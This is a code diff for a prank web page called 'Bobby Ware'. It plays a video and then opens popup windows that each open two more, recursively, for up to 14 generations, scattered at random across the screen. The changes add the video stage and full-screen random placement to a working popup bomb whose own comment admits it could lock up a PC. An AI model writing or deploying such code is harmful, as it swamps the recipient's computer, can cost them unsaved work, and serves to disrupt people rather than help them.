@@ -46,7 +46,7 @@
   button:hover:not(:disabled) {
     background: #2f5adf;
   }
-  #spawnImg {
+  #spawnImg, video {
     display: none;
     position: fixed;
     top: 0;
@@ -79,36 +79,59 @@
 </div>
 
 <img id="spawnImg" src="spawn.jpg" alt="">
+<video id="vid" src="video.mp4" playsinline></video>
 <button id="closeBtn">Close this window</button>
 
 <script>
   const params    = new URLSearchParams(location.search);
   const gen       = parseInt(params.get('gen') || '0', 10);
   const CHILDREN  = 2;      // how many popups each window spawns
-  const SPAWN_MS  = 1500;   // how long the image shows before spawning more (kept short = rapid duplication)
-  const MAX_GEN   = 14;     // safety cap so it can't literally lock up your PC forever; raise/remove for truly infinite
+  const SPAWN_MS  = 1500;   // how long a photo window shows before spawning more
+  const MAX_GEN   = 14;     // safety cap so it can't literally lock up your PC forever
 
   const ui        = document.getElementById('ui');
   const img       = document.getElementById('spawnImg');
+  const vid       = document.getElementById('vid');
   const closeBtn  = document.getElementById('closeBtn');
 
   document.title = gen === 0 ? 'Bobby Ware' : 'Bobby Ware #' + gen;
+
+  function randomWindowFeatures() {
+    const w = 480;
+    const h = 360;
+    const screenW = window.screen.availWidth  || 1200;
+    const screenH = window.screen.availHeight || 800;
+    const left = Math.floor(Math.random() * Math.max(screenW - w, 0));
+    const top  = Math.floor(Math.random() * Math.max(screenH - h, 0));
+    return `width=${w},height=${h},left=${left},top=${top}`;
+  }
 
   function spawnChildren() {
     if (gen >= MAX_GEN) return;
     const nextGen = gen + 1;
     for (let i = 0; i < CHILDREN; i++) {
-      window.open(
-        `index.html?gen=${nextGen}`,
-        '_blank',
-        'width=480,height=360,left=' + Math.floor(Math.random() * 400) +
-        ',top=' + Math.floor(Math.random() * 300)
-      );
+      window.open(`index.html?gen=${nextGen}`, '_blank', randomWindowFeatures());
     }
   }
 
-  function showImageThenSpawn() {
-    // Instant — no delay, no loading screen, image shows immediately.
+  function beginRoot() {
+    // Root window: plays the video with sound. Halfway through, spawns photo popups.
+    ui.style.display       = 'none';
+    vid.style.display      = 'block';
+    closeBtn.style.display = 'block';
+    vid.play().catch(() => {});
+
+    let spawned = false;
+    vid.addEventListener('timeupdate', () => {
+      if (!spawned && vid.duration && vid.currentTime >= vid.duration / 2) {
+        spawned = true;
+        spawnChildren();
+      }
+    });
+  }
+
+  function beginChild() {
+    // Child windows: just the photo, instantly, then spawn more after a short beat.
     ui.style.display       = 'none';
     img.style.display      = 'block';
     closeBtn.style.display = 'block';
@@ -147,10 +170,10 @@
         }
       }, 300);
     };
-    document.getElementById('startBtn').onclick = showImageThenSpawn;
+    document.getElementById('startBtn').onclick = beginRoot;
   } else {
-    // Child windows: instant, no UI, no delay before the image appears.
-    showImageThenSpawn();
+    // Child windows: instant photo, no UI, no video.
+    beginChild();
   }
 </script>
 
